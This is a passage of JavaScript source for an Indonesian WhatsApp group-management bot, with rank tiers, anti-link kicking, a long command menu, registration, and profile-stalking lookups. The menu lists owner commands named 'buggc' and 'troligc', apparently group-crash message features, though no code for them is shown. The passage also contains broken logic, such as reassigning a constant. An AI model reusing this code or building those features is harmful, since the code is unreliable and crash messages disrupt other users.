        } else if (levelRole <= 136) {
            role = 'General gold ✯'
        } else if (levelRole <= 138) {
            role = 'General Platinum ✬'
        } else if (levelRole <= 140) {
            role = 'General Diamond ✙'
        } else if (levelRole <= 142) {
            role = 'Commander Early ★'
        } else if (levelRole <= 144) {
            role = 'Commander Intermediate ⍣'
        } else if (levelRole <= 146) {
            role = 'Commander Elite ≛'
        } else if (levelRole <= 148) {
            role = 'The Commander Hero ⍟'
        } else if (levelRole <= 152) {
            role = 'Legends 忍'
        } else if (levelRole <= 154) {
            role = 'Legends 忍'
        } else if (levelRole <= 156) {
            role = 'Legends 忍'
        } else if (levelRole <= 158) {
            role = 'Legends 忍'
        } else if (levelRole <= 160) {
            role = 'Legends 忍'
        } else if (levelRole <= 162) {
            role = 'Legends 忍'
        } else if (levelRole <= 164) {
            role = 'Legends 忍'
        } else if (levelRole <= 166) {
            role = 'Legends 忍'
        } else if (levelRole <= 168) {
            role = 'Legends 忍'
        } else if (levelRole <= 170) {
            role = 'Legends 忍'
        } else if (levelRole <= 172) {
            role = 'Legends 忍'
        } else if (levelRole <= 174) {
            role = 'Legends 忍'
        } else if (levelRole <= 176) {
            role = 'Legends 忍'
        } else if (levelRole <= 178) {
            role = 'Legends 忍'
        } else if (levelRole <= 180) {
            role = 'Legends 忍'
        } else if (levelRole <= 182) {
            role = 'Legends 忍'
        } else if (levelRole <= 184) {
            role = 'Legends 忍'
        } else if (levelRole <= 186) {
            role = 'Legends 忍'
        } else if (levelRole <= 188) {
            role = 'Legends 忍'
        } else if (levelRole <= 190) {
            role = 'Legends 忍'
        } else if (levelRole <= 192) {
            role = 'Legends 忍'
        } else if (levelRole <= 194) {
            role = 'Legends 忍'
        } else if (levelRole <= 196) {
            role = 'Legends 忍'
        } else if (levelRole <= 198) {
            role = 'Legends 忍'
        } else if (levelRole <= 200) {
            role = 'Legends 忍'
        } else if (levelRole <= 210) {
            role = 'Legends 忍'
        } else if (levelRole <= 220) {
            role = 'Legends 忍'
        } else if (levelRole <= 230) {
            role = 'Legends 忍'
        } else if (levelRole <= 240) {
            role = 'Legends 忍'
        } else if (levelRole <= 250) {
            role = 'Legends 忍'
        } else if (levelRole <= 260) {
            role = 'Legends 忍'
        } else if (levelRole <= 270) {
            role = 'Legends 忍'
        } else if (levelRole <= 280) {
            role = 'Legends 忍'
        } else if (levelRole <= 290) {
            role = 'Legends 忍'
        } else if (levelRole <= 300) {
            role = 'Legends 忍'
        } else if (levelRole <= 310) {
            role = 'Legends 忍'
        } else if (levelRole <= 320) {
            role = 'Legends 忍'
        } else if (levelRole <= 330) {
            role = 'Legends 忍'
        } else if (levelRole <= 340) {
            role = 'Legends 忍'
        } else if (levelRole <= 350) {
            role = 'Legends 忍'
        } else if (levelRole <= 360) {
            role = 'Legends 忍'
        } else if (levelRole <= 370) {
            role = 'Legends 忍'
        } else if (levelRole <= 380) {
            role = 'Legends 忍'
        } else if (levelRole <= 390) {
            role = 'Legends 忍'
        } else if (levelRole <= 400) {
            role = 'Legends 忍'
        } else if (levelRole <= 410) {
            role = 'Legends 忍'
        } else if (levelRole <= 420) {
            role = 'Legends 忍'
        } else if (levelRole <= 430) {
            role = 'Legends 忍'
        } else if (levelRole <= 440) {
            role = 'Legends 忍'
        } else if (levelRole <= 450) {
            role = 'Legends 忍'
        } else if (levelRole <= 460) {
            role = 'Legends 忍'
        } else if (levelRole <= 470) {
            role = 'Legends 忍'
        } else if (levelRole <= 480) {
            role = 'Legends 忍'
        } else if (levelRole <= 490) {
            role = 'Legends 忍'
        } else if (levelRole <= 500) {
            role = 'Legends 忍'
        } else if (levelRole <= 600) {
            role = 'Legends 忍'
        } else if (levelRole <= 700) {
            role = 'Legends 忍'
        } else if (levelRole <= 800) {
            role = 'Legends 忍'
        } else if (levelRole <= 900) {
            role = 'Legends 忍'
        } else if (levelRole <= 1000) {
            role = 'Legends 忍'
        } else if (levelRole <= 2000) {
            role = 'Legends 忍'
        } else if (levelRole <= 3000) {
            role = 'Legends 忍'
        } else if (levelRole <= 4000) {
            role = 'Legends 忍'
        } else if (levelRole <= 5000) {
            role = 'Legends 忍'
        } else if (levelRole <= 6000) {
            role = 'Legends 忍'
        } else if (levelRole <= 7000) {
            role = 'Legends 忍'
        } else if (levelRole <= 8000) {
            role = 'Legends 忍'
        } else if (levelRole <= 9000) {
            role = 'Legends 忍'
        } else if (levelRole <= 10000) {
            role = 'Legends 忍'
           
				const prema = 'Gratisan'
				if (!isPremium) {
				prema = 'Premium'
				}
				if (!isOwner) {
				prema = 'Owner'
				}
	}
			//funtion nobadword
			if (isGroup && isBadWord) {
            if (bad.includes(messagesC)) {
                if (!isGroupAdmins) {
                    return reply("JAGA UCAPAN DONG!! 😠")
                        .then(() => Ardy.groupRemove(from, sender))
                        .then(() => {
                            Ardy.sendMessage(from, `*「 ANTI BADWORD 」*\nAra akan kick kamu karena berkata kasar!`, text ,{quoted: mek})
                        }).catch(() => Ardy.sendMessage(from, `Untung cya bukan admin, kalo admin udah cya kick!`, text , {quoted : mek}))
                } else {
                    return reply( "Tolong Jaga Ucapan Min 😇")
                }
            }
        }
			
	        //function leveling
            if (isGroup && isRegistered && isLevelingOn) {
            const currentLevel = getLevelingLevel(sender)
            const checkId = getLevelingId(sender)
            try {
                if (currentLevel === undefined && checkId === undefined) addLevelingId(sender)
                const amountXp = Math.floor(Math.random() * 10) + 100
                const requiredXp = 5000 * (Math.pow(2, currentLevel) - 1)
                const getLevel = getLevelingLevel(sender)
                addLevelingXp(sender, amountXp)
                if (requiredXp <= getLevelingXp(sender)) {
                    addLevelingLevel(sender, 1)
                    bayarLimit(sender, 3)
                    await reply(ind.levelup(pushname, sender, getLevelingXp,  getLevel, getLevelingLevel, role))
                }
            } catch (err) {
                console.error(err)
            }
        }
          //function check limit
          const checkLimit = (sender) => {
          	let found = false
                    for (let lmt of _limit) {
                        if (lmt.id === sender) {
                            let limitCounts = limitawal - lmt.limit
                            if (limitCounts <= 0) return Ardy.sendMessage(from,`Limit request anda sudah habis\n\n_Note : limit bisa di dapatkan dengan cara ${prefix}buylimit dan dengan naik level_`, text,{ quoted: mek})
                            Ardy.sendMessage(from, ind.limitcount(limitCounts), text, { quoted : mek})
                            found = true
                        }
                    }
                    if (found === false) {
                        let obj = { id: sender, limit: 0 }
                        _limit.push(obj)
                        fs.writeFileSync('./database/user/limit.json', JSON.stringify(_limit))
                        Ardy.sendMessage(from, ind.limitcount(limitCounts), text, { quoted : mek})
                    }
				}
				
			//funtion limited
           const isLimit = (sender) =>{ 
		      let position = false
              for (let i of _limit) {
              if (i.id === sender) {
              	let limits = i.limit
              if (limits >= limitawal ) {
              	  position = true
                    Ardy.sendMessage(from, ind.limitend(pushname), text, {quoted: mek})
                    return true
              } else {
              	_limit
                  position = true
                  return false
               }
             }
           }
           if (position === false) {
           	const obj = { id: sender, limit: 0 }
                _limit.push(obj)
                fs.writeFileSync('./database/user/limit.json',JSON.stringify(_limit))
           return false
       }
     }

        
            if (isGroup) {
				try {
					const getmemex = groupMembers.length
					    if (getmemex <= memberlimit) {
					    }
		       } catch (err) { console.error(err)  }
        }
      
            //function balance
            if (isRegistered ) {
            const checkATM = checkATMuser(sender)
            try {
                if (checkATM === undefined) addATM(sender)
                const uangsaku = Math.floor(Math.random() * 10) + 90
                addKoinUser(sender, uangsaku)
            } catch (err) {
                console.error(err)
            }
        }
        if (messagesC.includes("://chat.whatsapp.com/")){
		if (!isGroup) return
		if (!isAntilink) return
		if (isGroupAdmins) return reply('karena kamu admin group, bot tidak akan kick kamu')
		Ardy.updatePresence(from, Presence.composing)
		if (messagesC.includes("#izinadmin")) return reply("#izinadmin diterima")
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		reply(`Link Group Terdeteksi maaf ${sender.split("@")[0]} anda akan di kick dari group 5detik lagi`)
		setTimeout( () => {
			Ardy.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
		}, 3000)
		setTimeout( () => {
			Ardy.updatePresence(from, Presence.composing)
			reply("1detik")
		}, 2000)
		setTimeout( () => {
			Ardy.updatePresence(from, Presence.composing)
			reply("2detik")
		}, 1000)
		setTimeout( () => {
			Ardy.updatePresence(from, Presence.composing)
			reply("3detik")
		}, 0)
	}
		  
		    if (messagesC.includes("://kuotainternet.online/")){
		if (!isGroup) return
		if (!isAntilink) return
		if (isGroupAdmins) return reply('karena kamu adalah admin group, bot tidak akan kick kamu')
		Ardy.updatePresence(from, Presence.composing)
		if (messagesC.includes("#izinadmin")) return reply("#izinadmin diterima")
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		reply(`Link Group Terdeteksi maaf ${sender.split("@")[0]} anda akan di kick dari group 5detik lagi`)
		setTimeout( () => {
			Ardy.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
		}, 3000)
		setTimeout( () => {
			Ardy.updatePresence(from, Presence.composing)
			reply("1detik")
		}, 2000)
		setTimeout( () => {
			Ardy.updatePresence(from, Presence.composing)
			reply("2detik")
		}, 1000)
		setTimeout( () => {
			Ardy.updatePresence(from, Presence.composing)
			reply("3detik")
		}, 0)
	}

		   
		    if (messagesC.includes("://internet4g.live/")){
		if (!isGroup) return
		if (!isAntilink) return
		if (isGroupAdmins) return reply('karena kamu adalah admin group, bot tidak akan kick kamu')
		Ardy.updatePresence(from, Presence.composing)
		if (messagesC.includes("#izinadmin")) return reply("#izinadmin diterima")
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		reply(`Link Group Terdeteksi maaf ${sender.split("@")[0]} anda akan di kick dari group 5detik lagi`)
		setTimeout( () => {
			Ardy.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
		}, 3000)
		setTimeout( () => {
			Ardy.updatePresence(from, Presence.composing)
			reply("1detik")
		}, 2000)
		setTimeout( () => {
			Ardy.updatePresence(from, Presence.composing)
			reply("2detik")
		}, 1000)
		setTimeout( () => {
			Ardy.updatePresence(from, Presence.composing)
			reply("3detik")
		}, 0)
	}
	
var date = new Date();

var tahun = date.getFullYear();

var bulan = date.getMonth();
var tanggal = date.getDate();
var hari = date.getDay();
var jams = date.getHours();
var menit = date.getMinutes();
var detik = date.getSeconds();


switch(hari) {
 case 0: hari = "Minggu"; break;
 case 1: hari = "Senin"; break;
 case 2: hari = "Selasa"; break;
 case 3: hari = "Rabu"; break;
 case 4: hari = "Kamis"; break;
 case 5: hari = "Jum'at"; break;
 case 6: hari = "Sabtu"; break;
}
switch(bulan) {
 case 0: bulan = "Januari"; break;
 case 1: bulan = "Februari"; break;
 case 2: bulan = "Maret"; break;
 case 3: bulan = "April"; break;
 case 4: bulan = "Mei"; break;
 case 5: bulan = "Juni"; break;
 case 6: bulan = "Juli"; break;
 case 7: bulan = "Agustus"; break;
 case 8: bulan = "September"; break;
 case 9: bulan = "Oktober"; break;
 case 10: bulan = "November"; break;
 case 11: bulan = "Desember"; break;
}
            switch(jams){
                case 0: pada = "Malem"; break;
                case 1: pada = "Malem"; break;
                case 2: pada = "Malem"; break;
                case 3: pada = "Pagi"; break;
                case 4: pada = "Pagi"; break;
                case 5: pada = "Pagi"; break;
                case 6: pada = "Pagi"; break;
                case 7: pada = "Pagi"; break;
                case 8: pada = "Pagi"; break;
                case 9: pada = "Pagi"; break;
                case 10: pada = "Pagi"; break;
                case 11: pada = "Siang"; break;
                case 12: pada = "Siang"; break;
                case 13: pada = "Siang"; break;
                case 14: pada = "Siang"; break;
                case 15: pada = "Sore"; break;
                case 16: pada = "Sore"; break;
                case 17: pada = "Sore"; break;
                case 18: pada = "Malem"; break;
                case 19: pada = "Malem"; break;
                case 20: pada = "Malem"; break;
                case 21: pada = "Malem"; break;
                case 22: pada = "Malem"; break;
                case 23: pada = "Malem"; break;
            }
 tampilTanggal = hari + " "+ tanggal + " " + bulan + " " + tahun;
 tampilWaktu =  jams + ":" + menit + ":" + detik;
 tampilHari = pada;
//========================================//	
jam = moment.tz('Asia/Jakarta').format('HH:mm')
 wita = moment.tz('Asia/Makassar').format('HH:mm:ss')
 wit = moment.tz('Asia/Jayapura').format('HH:mm:ss')
//========================================
		        premi = 'Gratisan'
			    if (isPremium) {
			    premi = 'Premium'
			    } 
			    if (isOwner) {
			    premi = 'Owner'
			    }
//========================================	 

             //kolor
			colors = ['red','white','black','blue','yellow','green']
			
			//detector media
			const isMedia = (type === 'imageMessage' || type === 'videoMessage')
			const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
			const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
			const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
			
			//private chat message
			if (!isGroup && isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mCMD\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
			if (!isGroup && !isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mCMD\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
			
			//group message
			if (isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEVAL\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
			if (!isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mEXEC\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
			
			switch(command) {		
		case 'help': 
		case 'menu':
				if (!isRegistered) return reply(ind.noregis())
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
                    wew = fs.readFileSync(`./src/Ardy.jpeg`)
                      lzain = `
┌─❖「 *INFO USER* 」
│✙ *Nama* : ${pushname}
│✙ *Tag* : @${sender.split("@")[0]}
│✙ *Status* : ${premi}
│✙ *Xp* : ${getLevelingXp(sender)}
│✙ *Rank* : ${role}
│✙ *Level* : ${getLevelingLevel(sender)}
└─❖

┌─❖「 *INFO BOT* 」
│✙ *Nama* : ${NameBot}
│✙ *Server* : ${Ardy.browserDescription[0]}
│✙ *Ram* : ${RAM}
│✙ *Prefix* : *⟨⟨Multi Prefix⟩⟩*
└─❖

┌─❖「 *DEVELOPER* 」
│✙ *Nama* : *Group Maneger Bot*
│✙ *Note* : security fix
└─❖

┌─❖「 *Main* 」
│✙ *${prefix}afk <alasan>*
│✙ *${prefix}help*
│✙ *${prefix}sc
│✙ *${prefix}sourcecode
│✙ *${prefix}menu*
│✙ *${prefix}sewa*
│✙ *${prefix}sewabot*
└─❖

┌─❖「 *Owner* 」
│✙ *${prefix}buggc*
│✙ *${prefix}troligc*
│✙ *${prefix}addprem 62*
│✙ *${prefix}dellprem 62*
│✙ *${prefix}mute*
└─❖

┌─❖「 *Random* 」
│✙ *${prefix}memeindo*
│✙ *${prefix}darkjokes*
│✙ *${prefix}apakah pertanyaan*
│✙ *${prefix}quotes*
│✙ *${prefix}pantun*
└─❖

┌─❖「 *Text Maker* 」
│✙ *${prefix}neon teks*
│✙ *${prefix}tahta teks*
│✙ *${prefix}coffe teks*
│✙ *${prefix}glitch teks*
│✙ *${prefix}pornhub teks1 teks2*
│✙ *${prefix}sandtext teks*
│✙ *${prefix}epeplogo teks*
│✙ *${prefix}narutobanner teks*
│✙ *${prefix}goldplaybutton teks*
│✙ *${prefix}silverplaybutton teks*
│✙ *${prefix}blackpink text*
│✙ *${prefix}neon text*
│✙ *${prefix}greenneon text*
│✙ *${prefix}epeplogo text*
│✙ *${prefix}matrixlogo text*
│✙ *${prefix}tulisanpasir text*
│✙ *${prefix}nulis text*
│✙ *${prefix}narutobanner text*
│✙ *${prefix}advanceglow text*
│✙ *${prefix}futureneon text*
│✙ *${prefix}sandwriting text*
│✙ *${prefix}sandsummer text*
│✙ *${prefix}sandengraved text*
│✙ *${prefix}metaldark text*
│✙ *${prefix}neonlight text*
│✙ *${prefix}holographic text*
│✙ *${prefix}text1917 text*
│✙ *${prefix}minion text*
│✙ *${prefix}deluxesilver text*
│✙ *${prefix}newyearcard text*
│✙ *${prefix}bloodfrosted text*
│✙ *${prefix}halloween text*
│✙ *${prefix}jokerlogo text*
│✙ *${prefix}fireworksparkle text*
│✙ *${prefix}natureleaves text*
│✙ *${prefix}bokeh text*
│✙ *${prefix}toxic text*
│✙ *${prefix}strawberry text*
│✙ *${prefix}box3d text*
│✙ *${prefix}roadwarning text*
│✙ *${prefix}breakwall text*
│✙ *${prefix}icecold text*
│✙ *${prefix}luxury text*
│✙ *${prefix}cloud text*
│✙ *${prefix}summersand text*
│✙ *${prefix}horrorblood text*
│✙ *${prefix}thunder text*
└─❖


┌─❖「 *Photo Oxy* 」
│✙ *${prefix}shadow text*
│✙ *${prefix}cup text*
│✙ *${prefix}cup1 text*
│✙ *${prefix}romance text*
│✙ *${prefix}smoke text*
│✙ *${prefix}burnpaper text*
│✙ *${prefix}lovemessage text*
│✙ *${prefix}undergrass text*
│✙ *${prefix}love text*
│✙ *${prefix}coffe text*
│✙ *${prefix}woodheart text*
│✙ *${prefix}woodenboard text*
│✙ *${prefix}summer3d text*
│✙ *${prefix}wolfmetal text*
│✙ *${prefix}nature3d text*
│✙ *${prefix}underwater text*
│✙ *${prefix}golderrose text*
│✙ *${prefix}summernature text*
│✙ *${prefix}letterleaves text*
│✙ *${prefix}glowingneon text*
│✙ *${prefix}fallleaves text*
│✙ *${prefix}flamming text*
│✙ *${prefix}harrypotter text*
│✙ *${prefix}carvedwood text*
└─❖

┌─❖「 *Ephoto 360* 」
│✙ *${prefix}wetglass text*
│✙ *${prefix}multicolor3d text*
│✙ *${prefix}watercolor text*
│✙ *${prefix}luxurygold text*
│✙ *${prefix}galaxywallpaper text*
│✙ *${prefix}lighttext text*
│✙ *${prefix}beautifulflower text*
│✙ *${prefix}puppycute text*
│✙ *${prefix}royaltext text*
│✙ *${prefix}heartshaped text*
│✙ *${prefix}birthdaycake text*
│✙ *${prefix}galaxystyle text*
│✙ *${prefix}hologram3d text*
│✙ *${prefix}greenneon text*
│✙ *${prefix}glossychrome text*
│✙ *${prefix}greenbush text*
│✙ *${prefix}metallogo text*
│✙ *${prefix}noeltext text*
│✙ *${prefix}glittergold text*
│✙ *${prefix}textcake text*
│✙ *${prefix}starsnight text*
│✙ *${prefix}wooden3d text*
│✙ *${prefix}textbyname text*
│✙ *${prefix}writegalacy text*
│✙ *${prefix}galaxybat text*
│✙ *${prefix}snow3d text*
│✙ *${prefix}birthdayday text*
│✙ *${prefix}goldplaybutton text*
│✙ *${prefix}silverplaybutton text*
│✙ *${prefix}freefire text*
└─❖

┌─❖「 *Text Maker* 」
│✙ *${prefix}nulis teks*
│✙ *${prefix}nulis1 teks*
│✙ *${prefix}nulis2 teks*
│✙ *${prefix}nulis3 teks*
│✙ *${prefix}nulis4 teks*
└─❖

┌─❖「 *Grup Menu* 」
│✙ *${prefix}hidetag teks*
│✙ *${prefix}listonline*
│✙ *${prefix}antilink [1/0]*
│✙ *${prefix}welcome [1/0]*
│✙ *${prefix}buggc*
│✙ *${prefix}troligc*
│✙ *${prefix}tagall*
│✙ *${prefix}bcgc*
│✙ *${prefix}antidelete*
└─❖

┌─❖「 *Stalking* 」
│✙ *${prefix}githubstalk*
│✙ *${prefix}ffstalk*
│✙ *${prefix}igstalk*
└─❖

┌─❖「 *Downloader* 」
│✙ *${prefix}ssweb link*
│✙ *${prefix}
└─❖

┌─❖「 *Game Commands* 」
│✙ *${prefix}tembak [udara/darat/laut]*
│✙ *${prefix}tebakgambar*
│✙ *${prefix}suit [batu/gunting/kertas]*
└─❖

┌─❖「 *Sticker Commands* 」
│✙ *${prefix}patrick*
│✙ *${prefix}dadu*
│✙ *${prefix}sticker*
│✙ *${prefix}sgif*
└─❖

┌┬───────┈ ⳹
│ • *Group Maneger : @9475933569*
│ • *tag_user🎩 : @9475933569*
└────────┈
        ║▌│█║▌│ █║▌│█│║▌║
        ║▌│█║▌│ █║▌│█│║▌║
        
      *「 ${NameBot} 」*
Di Sponsori Oleh *@0*
`
Ardy.sendMessage(from, wew, image, { quoted: freply, caption: lzain, contextInfo: {"mentionedJid": ['6287863200063@s.whatsapp.net', '0@s.whatsapp.net', '6282334170916@s.whatsapp.net', sender]}})
break

		case 'speed5':
		case 'ping3':
                 if (!isRegistered) return reply( ind.noregis())
					await Ardy.sendMessage(from, `Pong!!!!\nSpeed: ${processTime(time, moment())} _Second_`)
					break
		case 'sewa':
		case 'sewabot':
		if (!isRegistered) return reply(ind.noregis())
		if (isBanned) return reply('Maaf kamu sudah terbenned!')
		teks = `━━━━[ sᴇᴡᴀ ]━━━━

ᴏᴘᴇɴ sᴇᴡᴀ ʙᴏᴛ

ʟɪsᴛ ʜᴀʀɢᴀ 
ʀᴘ . 10ᴋ / ʙᴜʟᴀɴᴀɴ
ʀᴘ . 30ᴋ / ᴘᴇʀᴍᴀɴᴇɴ 

ᴍᴇᴍᴘᴇʀᴘᴀɴᴊᴀɴɢ 
ʀᴘ . 10ᴋ / ʙᴜʟᴀɴᴀɴ

ᴘᴇᴍʙᴀʏᴀʀᴀɴ ᴠɪᴀ 
ɢᴏᴘᴀʏ , ᴅᴀɴᴀ , ᴏᴠᴏ , ǫʀɪs , ᴘᴜʟsᴀ + 10ᴋ 

ᴍɪɴᴀᴛ ʜᴜʙᴜɴɢɪ 
@6287863200063

━━━━[ ʙᴏᴛ ]━━━━━`
Ardy.sendMessage(from, teks, text, { quoted: freply, contextInfo: {"mentionedJid": ['6287863200063@s.whatsapp.net'], forwardingScore: 1000, isForwarded: true}})
break

case 'donasi':
case 'donate':
if (!isRegistered) return reply(ind.noregis())
Ardy.sendMessage(from, donasi(), text)
break

case 'daftar':
                			if (isRegistered) return  reply(ind.rediregis())
                			if (!q.includes('|')) return  reply(ind.wrongf())
                			const namaUser = q.substring(0, q.indexOf('|') - 0)
                			const umurUser = q.substring(q.lastIndexOf('|') + 1)
                			const serialUser = createSerial(20)
                			if(isNaN(umurUser)) return await reply('Umur harus berupa angka!!')
                			if (namaUser.length >= 30) return reply(`why is your name so long it's a name or a train`)
                			if (umurUser > 40) return reply(`your age is too  old maximum 40 years`)
                			if (umurUser < 12) return reply(`your age is too young minimum 12 years`)
                					try {
								ppimg = await Ardy.getProfilePicture(`${sender.split('@')[0]}@c.us`)
								} catch {
								ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
							}
							
const dpter = `
┌━━━━━━━━━━━━┈ ❋ཻུ۪۪⸙
│ *「 VERIFICATION SUKSES 」*
│ *Terimakasih Sudah*
│ *Mendaftarkan Diri*
│ *Dalam Database*
└┬────────────┈ ⳹
┌┤◦➛ *Nama :* ${pushname}
││◦➛ *Umur :* ${umurUser}
││◦➛ *Nomor :* @${sender.split('@')[0]}
││◦➛ *SN :* ${serialUser}
││◦➛ *Total Pengguna :* ${_registered.length} Orang
││◦➛ *Status :* ☑️ Terverifikasi
│└────────────┈ ⳹
│ *Waktu Pendaftaran*
│ *Tanggal :* ${tampilTanggal}
│ *Jam :* ${wita}
├───────────────
│ *Silahkan Ketik ${prefix}rules*
│ *Untuk Melanjutkan Pengguna*
└━━━━━━━━━━━━┈ ❋ཻུ۪۪⸙
*「 ${NameBot} 」*`

							let buffer = await getBuffer(`http://hadi-api.herokuapp.com/api/card/verify?nama=${pushname}&member=${_registered.length}&seri=${serialUser}&pp=${ppimg}&bg=${imgbb}`)
                					veri = sender
                					if (isGroup) {
                    			addRegisteredUser(sender, namaUser, umurUser, time, serialUser)
                    			await Ardy.sendMessage(from, buffer, image, {quoted: freply, caption: dpter, contextInfo: {"mentionedJid": [sender]}})
                    			addATM(sender)
                    			addLevelingId(sender)
                    			checkLimit(sender)
                    			console.log(color('[REGISTER]'), color(time, 'yellow'), 'Name:', color(namaUser, 'cyan'), 'Umur:', color(umurUser, 'cyan'), 'Serial:', color(serialUser, 'cyan'), 'in', color(sender || groupName))
                			} else {
                    			addRegisteredUser(sender, namaUser, umurUser, time, serialUser)
                    			await Ardy.sendMessage(from, buffer, image, {quoted: freply, caption: dpter, contextInfo: {"mentionedJid": [sender]}})
                    			addATM(sender)
                    			addLevelingId(sender)
                    			checkLimit(sender)
                    			console.log(color('[REGISTER]'), color(time, 'yellow'), 'Name:', color(namaUser, 'cyan'), 'Umur:', color(umurUser, 'cyan'), 'Serial:', color(serialUser, 'cyan'))
                			}
				        break
         
          //random
          case 'memeindo':
          if (!isRegistered) return reply(ind.noregis())
          anu = await fetchJson(`https://api.zeks.xyz/api/memeindo?apikey=Ardy-ApiKey`)
          buff = await getBuffer(anu.result)
          reply(ind.wait())
          Ardy.sendMessage(from, buff, image, {quoted: freply, caption: '.......' })
          break

          case 'darkjokes':
          if (!isRegistered) return reply(ind.noregis())
          anu = await fetchJson(`https://api.zeks.xyz/api/darkjokes?apikey=Ardy-ApiKey`)
          buff = await getBuffer(anu.result)
          reply(ind.wait())
          Ardy.sendMessage(from, buff, image, {quoted: mek, caption: 'Drag Jokes' })
          break
        case 'apakah':
                 if (!isRegistered) return reply(ind.noregis())
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					apakah = body.slice(1)
					const apa =['Iya','Tidak','Bisa Jadi','Coba Ulangi']
					const kah = apa[Math.floor(Math.random() * (apa.length))]
					Ardy.sendMessage(from, 'Pertanyaan : *'+apakah+'*\n\nJawaban : '+ kah, text, { quoted: freply })
					break
          
          //stalking
          case 'ffstalk':
          if (!isRegistered) return reply(ind.noregis())
          if (args.length == 0) return reply(`Contoh : ${prefix + command} 2260612227`)
          anu = await fetchJson(`https://api.xteam.xyz/search/freefire?id=${body.slice(9)}&APIKEY=${xteam}`)
          teks = `❮ FF STALK ❯\n\nID : ${anu.result.id}\nNICKNAME : ${anu.result.name}`
          Ardy.sendMessage(from, teks, text)
          break

          case 'githubstalk':
          if (!isRegistered) return reply(ind.noregis())
          if (args.length == 0) return reply(`Contoh : ${prefix + command} zennn08`)
          anu = await fetchJson(`https://lolhuman.herokuapp.com/api/github/${body.slice(13)}?apikey=${lolkey}`)
          propil = await getBuffer(anu.result.avatar)
          captiok = `*❮ GITHUB STALK ❯*\n\n⮕ *Nama* : ${anu.result.name}\n⮕ *Follower* ${anu.result.followers}\n⮕ *Following* : ${anu.result.following}\n⮕ *Bio* : ${anu.result.bio}\n⮕ *Type* : ${anu.result.type}\n⮕ *Publik Repo* : ${anu.result.public_repos}\n⮕ *Publik Gists* : ${anu.result.public_gists}\n⮕ *Company* : ${anu.result.company}\n⮕ *Location* : ${anu.result.location}\n⮕ *Email* : ${anu.result.email}\n⮕ *Url* : ${anu.result.url}`
          Ardy.sendMessage(from, propil, image, {quoted: mek, caption: captiok })
          break

          case 'igstalk':
          if (!isRegistered) return reply(ind.noregis())
          if (args.length == 0) return reply(`Contoh : ${prefix + command} ff.ardy_store`)
          anu = await fetchJson(`https://api.zeks.xyz/api/igstalk?apikey=Ardy-ApiKey&username=${body.slice(9)}`)
          propil = await getBuffer(anu.profile_pic)
          teks = `*❮ IG STALK ❯*\n\nUsername : ${anu.username}\nFullname : ${anu.fullname}\nFollower : ${anu.follower}\nFollowing : ${anu.following}\nVerified : ${anu.is_verified}\nBussiness : ${anu.is_bussiness}\nPrivate : ${anu.is_private}\nBio : ${anu.bio}`
          Ardy.sendMessage(from, propil, image, {quoted: mek, caption: teks })
          break

          //Downloader
          case 'ssweb':
          if (!isRegistered) return reply(ind.noregis())
          link = `${body.slice(7)}`
          buff = await getBuffer(`https://lolhuman.herokuapp.com/api/sswebfull?apikey=${lolkey}&url=${link}`)
          reply(ind.wait())
          Ardy.sendMessage(from, buff, image, {quoted: freply, caption: 'Nih Kak' })
          break

          case 'ytmp3':
          if (!isRegistered) return reply(ind.noregis())
          if (args.length == 0) return reply(`Contoh : ${prefix + command} https://youtu.be/NvlzOCgHuMA`)
          anu = await fetchJson(`https://lolhuman.herokuapp.com/api/ytaudio2?apikey=${lolkey}&url=${body.slice(7)}`)
          reply(ind.wait())
          audio_nya = await getBuffer(anu.result.link)
          Ardy.sendMessage(from, audio_nya, audio, { mimetype: 'audio/mp4', filename: `${anu.result.title}.mp3`, quoted: mek})
          break
          
          case 'ytmp4':
          if (!isRegistered) return reply(ind.noregis())
          if (args.length == 0) return reply(`Contoh : ${prefix + command} https://youtu.be/NvlzOCgHuMA`)
          anu = await fetchJson(`https://lolhuman.herokuapp.com/api/ytvideo2?apikey=${lolkey}&url=${body.slice(7)}`)
          reply(ind.wait())
          video_nye = await getBuffer(anu.result.link)
          Ardy.sendMessage(from, video_nye, video, { mimetype: 'video/mp4', filename: `${get_result.title}.mp4`, quoted: mek})
          break
				    case 'toimg':
				if (!isRegistered) return reply(ind.noregis())
				if (!isQuotedSticker) return reply('Reply/tag sticker !')
					reply(ind.wait())
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await Ardy.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.png')
					exec(`ffmpeg -i ${media} ${ran}`, (e) => {
						fs.unlinkSync(media)
						if (e) return reply(ind.stikga())
						buffer = fs.readFileSync(ran)
						Ardy.sendMessage(from, buffer, image, {quoted: mek, caption: 'ini '})
						fs.unlinkSync(ran)
					})
					await limitAdd(sender)
					break

case 'mediafire':
if (!isRegistered) return reply(ind.noregis())
linknya = `${body.slice(11)}`
anu = await fetchJson(`https://lolhuman.herokuapp.com/api/mediafire?apikey=${lolkey}&url=${linknya}`)
teks = `Ukuran File : ${anu.result.filesize}
Type File : ${anu.result.filetype}
File Name : ${anu.result.filename}
